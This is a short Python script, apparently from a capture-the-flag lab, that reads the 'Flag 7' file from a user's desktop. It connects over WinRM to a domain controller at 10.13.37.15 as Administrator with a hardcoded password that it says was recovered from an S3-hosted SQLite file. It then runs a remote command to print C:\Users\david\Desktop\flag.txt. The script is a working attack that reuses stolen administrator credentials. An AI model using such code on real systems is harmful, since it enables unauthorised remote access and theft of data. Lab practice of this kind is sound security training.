#!/usr/bin/env python3
"""Read david desktop flag via Administrator recovered from S3 SQLite (Flag 7)."""
import subprocess
import sys

ADMIN_PASS = "K2h3v4n@#!5_34"
DC = "10.13.37.15"


def main() -> None:
    code = (
        "import winrm; "
        f"s=winrm.Session('{DC}', auth=('Administrator', '{ADMIN_PASS}'), transport='ntlm'); "
        "print(s.run_cmd('type C:\\\\Users\\\\david\\\\Desktop\\\\flag.txt').std_out.decode())"
    )
    subprocess.run([sys.executable, "-c", code], check=True)


if __name__ == "__main__":
    main()
